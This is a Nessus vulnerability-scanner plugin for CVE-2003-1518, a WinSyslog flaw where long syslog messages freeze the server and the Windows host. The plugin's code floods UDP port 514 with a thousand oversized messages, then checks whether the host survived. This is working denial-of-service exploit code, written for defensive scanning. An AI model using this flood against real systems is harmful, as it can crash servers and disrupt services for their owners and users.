#
# WinSysLog DoS
# http://www.winsyslog.com
#

# Changes by Tenable:
# - Revised plugin title, OSVDB ref, family change (6/25/09)

include("compat.inc");

if (description)
{
  script_id(11884);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2016/11/02 20:50:26 $");

  script_cve_id("CVE-2003-1518");
  script_bugtraq_id(8821);
  script_osvdb_id(2667);

  script_name(english:"WinSyslog Long Syslog Message Remote DoS");
  script_summary(english:"Attempts to crash the remote host");

  script_set_attribute(attribute:"synopsis", value:"The remote syslog service has a denial of service vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running WinSyslog, an enhanced syslog server for
Windows. A vulnerability in the product allows remote attackers to
cause the WinSyslog to freeze, which in turn will also freeze the
operating system on which the product executes.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2003/Oct/1208");
  script_set_attribute(attribute:"solution", value:"Contact the vendor for a patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(119);

  script_set_attribute(attribute:"vuln_publication_date", value:"2003/09/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2003/10/15");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DENIAL);	# ACT_FLOOD?
  script_copyright(english:"This script is copyright (C) 2003-2016 Matthew North");
  script_family(english:"Windows");

  script_dependencies('os_fingerprint.nasl');
  script_require_keys("Settings/ParanoidReport");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");

os = get_kb_item("Host/OS");
if ( os && "Windows" >!< os ) exit(0);

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = 514;
if (! get_udp_port_state(port)) exit(0, "UDP port "+port+" is not open.");
soc = open_sock_udp(port);
if(!soc) exit(1, "Could not open socket to UDP port "+port+".");
start_denial();

for(i=0; i < 1000; i++) {
                        num = (600+i)*4;
			bufc = string(crap(num));
                        buf = string("<00>", bufc);
	                send(socket:soc,data:buf);
            }

close(soc);
sleep(5);
alive = end_denial();
if(!alive)security_hole(port:514, proto:"udp");
